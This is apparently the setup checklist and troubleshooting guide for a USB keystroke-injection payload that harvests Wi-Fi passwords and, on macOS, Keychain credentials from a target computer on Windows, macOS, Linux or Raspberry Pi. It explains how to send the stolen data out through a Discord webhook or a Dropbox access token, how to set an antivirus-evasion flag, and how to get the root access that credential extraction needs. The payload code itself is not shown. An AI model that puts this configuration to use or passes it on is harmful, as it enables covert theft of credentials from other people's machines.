--- SECTION A: USB DRIVES (Configure for your target OS) ---

FOR WINDOWS:
  [  ] 1. Open payload.txt in Notepad
  [  ] 2. Find: DEFINE #DRIVE E:
  [  ] 3. Change E: to your USB drive letter (check File Explorer)
       Common: D:, E:, F:, G:
  [  ] 4. Leave other #DRIVE_* lines unchanged

FOR macOS:
  [  ] 1. Find: DEFINE #DRIVE_MACOS /Volumes
  [  ] 2. Usually correct, but verify by running: mount | grep Volumes
  [  ] 3. Note the volume name of your USB
  [  ] 4. Update if needed: DEFINE #DRIVE_MACOS /Volumes/YourUSBName

FOR LINUX:
  [  ] 1. Find: DEFINE #DRIVE_LINUX /mnt
  [  ] 2. Check your USB mount point: lsblk or mount
  [  ] 3. Update if needed: DEFINE #DRIVE_LINUX /mnt/usb
  [  ] 4. Ensure USB is mounted before running

FOR RASPBERRY PI:
  [  ] 1. Find: DEFINE #DRIVE_RPI /media/pi
  [  ] 2. This is standard for RPi OS
  [  ] 3. Verify USB is mounted: lsblk

--- SECTION B: BASIC CONFIGURATION ---

[  ] 1. Find: DEFINE #FILENAME wifi_vault
[  ] 2. Change to any name you want (examples: passwords, data, vault)
[  ] 3. No spaces, no special characters!

[  ] 4. Find: DEFINE #PROTECTION_FILE my_password
[  ] 5. Change if desired (this is the "safety" file)
[  ] 6. If this file exists on Desktop, payload WON'T run

--- SECTION C: EXPORT OPTIONS ---

IF USING DISCORD WEBHOOK:
  [  ] 1. Go to your Discord server
  [  ] 2. Create webhook: Server Settings → Webhooks → New Webhook
  [  ] 3. Copy the webhook URL
  [  ] 4. Find: DEFINE #WEBHOOK YOUR_WEBHOOK_URL
  [  ] 5. Paste your URL: DEFINE #WEBHOOK https://discord.com/api/webhooks/...

IF USING DROPBOX:
  [  ] 1. Go to https://www.dropbox.com/developers
  [  ] 2. Create app and generate access token
  [  ] 3. Copy the token
  [  ] 4. Find: DEFINE #DROPBOX YOUR_DROPBOX_TOKEN
  [  ] 5. Paste: DEFINE #DROPBOX YOUR_TOKEN_HERE

IF USING CUSTOM LOCATION:
  [  ] 1. Find: DEFINE #CUSTOM_PATH C:\Users\Public
  [  ] 2. Change to desired folder
       Windows examples: C:\Temp, D:\Data, %AppData%\Local
       Mac examples: /tmp, /Library/Logs, /Users/Shared
       Linux examples: /tmp, /home/user/Documents

--- SECTION D: ANTIVIRUS CONFIGURATION ---

================================================================================
                     TROUBLESHOOTING BY OS
================================================================================

--- WINDOWS ISSUES ---

PROBLEM: "Access Denied" error
SOLUTION: Run as Administrator or use Protection Mode

PROBLEM: Antivirus blocking execution
SOLUTION: Set AV_EVASION to 1 in payload.txt

PROBLEM: USB drive not found
SOLUTION: Check drive letter is correct (see File Explorer)

--- macOS ISSUES ---

PROBLEM: "Permission denied" when running
SOLUTION: macOS requires admin password for Keychain access

PROBLEM: USB mount path incorrect
SOLUTION: Run 'mount' in terminal to find correct path

--- LINUX ISSUES ---

PROBLEM: USB not mounted
SOLUTION: Run: sudo mount /dev/sdX /mnt/usb first

PROBLEM: Credentials not extracted
SOLUTION: Need root access or sudo privileges

--- RASPBERRY PI ISSUES ---

PROBLEM: Payload not starting
SOLUTION: Ensure USB is properly mounted before execution

PROBLEM: File permission errors
SOLUTION: USB needs write permissions for 'pi' user
